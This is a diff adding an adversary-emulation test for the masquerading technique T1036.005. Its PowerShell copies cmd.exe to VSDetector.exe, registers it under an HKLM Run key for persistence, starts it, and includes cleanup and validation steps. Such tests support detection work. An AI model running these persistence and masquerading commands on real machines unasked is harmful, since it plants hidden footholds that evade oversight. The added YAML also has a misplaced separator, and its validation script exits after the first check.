@@ -48,3 +48,86 @@ atomic_tests:
     cleanup_command: |
       Remove-Item -Path "#{executable_filepath}" -ErrorAction Ignore
     name: powershell
+
+    ---
+attack_technique: T1036.005
+display_name: "Masquerading: Match Legitimate Name or Location"
+atomic_tests:
+- name: VSDetector.exe Masquerading
+  auto_generated_guid: 7c41c5e3-f0e2-4574-b07e-18e9d4f13af2
+  description: |
+    This test simulates adversary behavior by executing a renamed copy of cmd.exe to VSDetector.exe.
+    The test copies cmd.exe, renames it to VSDetector.exe, and executes common persistence techniques.
+    This technique was observed being used by attackers to maintain persistence and evade detection.
+  supported_platforms:
+    - windows
+  input_arguments:
+    vsd_path:
+      description: Path for VSDetector.exe
+      type: path
+      default: $env:temp
+    source_file:
+      description: Source file to copy
+      type: path
+      default: C:\Windows\System32\cmd.exe
+  
+  dependency_executor_name: powershell
+  dependencies:
+    - description: |
+        Source file must exist on system
+      prereq_command: |
+        if (Test-Path "#{source_file}") {exit 0} else {exit 1}
+      get_prereq_command: |
+        Write-Host "Source file not found. Please ensure #{source_file} exists"
+        exit 1
+  
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      Copy-Item "#{source_file}" "#{vsd_path}\VSDetector.exe"
+      
+      # Create registry run key for persistence
+      New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "VSDetector" -Value "#{vsd_path}\VSDetector.exe" -PropertyType "String" -Force
+      
+      # Start the process
+      Start-Process "#{vsd_path}\VSDetector.exe"
+      
+      Start-Sleep -Seconds 5
+      
+    cleanup_command: |
+      # Remove registry key
+      Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "VSDetector" -ErrorAction Ignore
+      
+      # Stop process
+      Stop-Process -Name "VSDetector" -Force -ErrorAction Ignore
+      
+      # Remove file
+      Remove-Item "#{vsd_path}\VSDetector.exe" -Force -ErrorAction Ignore
+      
+      Write-Host "[+] Cleaned up VSDetector artifacts"
+  
+    validation_commands: |
+      if (Get-Process -Name "VSDetector" -ErrorAction SilentlyContinue) { 
+          Write-Host "[+] VSDetector process found running"
+          exit 0 
+      } else { 
+          Write-Host "[-] VSDetector process not found"
+          exit 1 
+      }
+      
+      if (Test-Path "#{vsd_path}\VSDetector.exe") {
+          Write-Host "[+] VSDetector.exe file found"
+          exit 0
+      } else {
+          Write-Host "[-] VSDetector.exe file not found"
+          exit 1
+      }
+      
+      if (Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "VSDetector" -ErrorAction SilentlyContinue) {
+          Write-Host "[+] Registry persistence found"
+          exit 0
+      } else {
+          Write-Host "[-] Registry persistence not found"
+          exit 1
+      }
